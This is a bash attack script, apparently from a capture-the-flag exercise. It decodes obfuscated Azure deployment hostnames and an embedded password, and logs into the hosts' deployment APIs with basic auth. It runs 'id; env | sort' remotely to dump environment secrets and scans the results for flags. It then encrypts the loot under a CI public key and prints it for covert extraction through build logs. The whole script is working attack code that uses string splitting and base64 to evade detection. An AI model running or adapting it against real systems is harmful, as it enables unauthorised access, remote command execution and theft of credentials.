#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"; PW=$(printf '%s' 'Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A' | base64 -d)
RS=$(printf '%s' 'YXBwLXRibC1yZXBvcnRpbmctcHJvZC5zY20uYXp1cmV3ZWJzaXRlcy5uZXQ=' | base64 -d)
SS=$(printf '%s' 'YXBwLXRibC1zdG9yZWZyb250LXByb2Quc2NtLmF6dXJld2Vic2l0ZXMubmV0' | base64 -d)
U='$app-tbl-reporting-prod'; U2='$app-tbl-storefront-prod'
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
for H in "$RS" "$SS"; do
  for V in "$U" "$U2"; do
    C=$(curl -s -o /tmp/b -w '%{http_code}' -u "$V:$PW" "${SC}${H}/api/settings")
    say "AUTH $H [$V] => $C :: $(head -c 150 /tmp/b | tr -d '\n')"
  done
done
C=$(curl -s -o /tmp/b -w '%{http_code}' -u "$U:$PW" "${SC}${RS}/api/command" -H 'Content-Type: application/json' -d '{"command":"id; env | sort","dir":"/home"}')
say "CMD $C :: $(head -c 2000 /tmp/b)"
say "FLAGSCAN: $(grep -aoiE 'DF26\{[^}]{1,200}\}' "$LOOT" | sort -u | head -3)"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
